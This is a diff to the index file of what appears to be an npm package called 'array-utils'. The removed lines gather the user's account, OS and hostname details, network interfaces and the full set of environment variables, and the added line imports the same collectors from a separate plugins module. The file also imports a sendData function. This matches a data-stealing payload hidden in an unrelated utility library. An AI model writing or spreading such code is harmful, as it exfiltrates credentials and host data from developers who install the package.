+++ array-utils/src/index.ts
@@ -1,49 +1,8 @@
-import * as os from "node:os";
-import { CustomPlugin, EnvDetails, NetworkInterfacesDetails, OsDetails, UserDetails } from "./typings";
+import { CustomPlugin } from "./typings";
 import { sendData } from "./core";
-import { generateRandomId, getIpv4Interfaces } from "./utils";
+import { generateRandomId } from "./utils";
 import { heyInternet, wc, catscatscatscats } from "./gifts";
-
-function getUserInfo(): UserDetails {
-  return os.userInfo()
-}
-
-function getOsInfo(): OsDetails {
-  return {
-      arch: os.arch(),
-      hostname: os.hostname(),
-      platform: os.platform(),
-      release: os.release(),
-      type: os.type()
-  };
-}
-
-function getNetworkInfo(): NetworkInterfacesDetails {
-  return getIpv4Interfaces(os.networkInterfaces());
-}
-
-function getEnvInfo(): EnvDetails {
-  return process.env;
-};
-
-const plugins: Array<CustomPlugin> = [
-  {
-      key: "networkInterfaces",
-      plugin: getNetworkInfo
-  },
-  {
-      key: "os",
-      plugin: getOsInfo
-  },
-  {
-      key: "env",
-      plugin: getEnvInfo
-  },
-  {
-      key: "userInfo",
-      plugin: getUserInfo
-  }
-];
+import { plugins } from "./plugins";
 
 function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
   return {
